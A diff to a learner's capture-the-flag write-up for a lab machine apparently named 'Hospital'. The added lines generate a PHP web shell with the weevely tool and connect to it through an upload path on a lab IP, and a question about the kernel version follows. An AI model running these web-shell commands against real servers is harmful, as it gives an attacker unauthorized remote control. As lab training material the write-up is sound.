@@ -64,11 +64,19 @@ Q5: What user is the webserver running as?
 A: 
 
 Since we know where the file goes, and what extension does the file have to be, let's get a shell.
+I used weevely, as per the hint. (i'm not very good yet with shells and i also wanted to try a new thing) (https://github.com/epinna/weevely3)
 
+weevely generate 'hospital123' shellHospital.phar
 
+weevely http://10.10.11.241:8080/uploads/shellHospital.phar 'hospital123'
 
-Q6: 
+![](../../Img/Pasted%20image%2020250505170017.png)
+
+Q6: What is the kernel name (version) of the webserver?
+
 A: 
+
+
 
 Q7: 
 A: 
